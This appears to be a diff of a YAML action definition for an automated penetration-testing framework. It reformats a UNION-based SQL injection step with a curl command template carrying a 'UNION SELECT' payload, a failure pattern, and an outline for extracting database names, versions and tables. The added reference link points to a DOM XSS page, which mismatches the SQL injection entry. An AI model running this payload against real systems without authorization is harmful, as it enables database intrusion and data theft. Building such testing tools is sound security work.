@@ -2,15 +2,17 @@ name: sqli_union
 category: web
 description: UNION-based SQL injection
 preconditions:
-  - service.port==80
+- service.port==80
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "curl -s '{target_url}?id=1 UNION SELECT 1,2,3--'"
+command_template: curl -s '{target_url}?id=1 UNION SELECT 1,2,3--'
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: no UNION columns|403|500|WAF|blocked
   timeout: 30
 model_tier: haiku
-mechanism: "UNION SQLi: determine column count (ORDER BY N), find visible columns, extract: database(), version(), table_names from information_schema, columns, data."
+mechanism: 'UNION SQLi: determine column count (ORDER BY N), find visible columns,
+  extract: database(), version(), table_names from information_schema, columns, data.'
+hacktricks_ref: pentesting-web/xss-cross-site-scripting/dom-xss.md
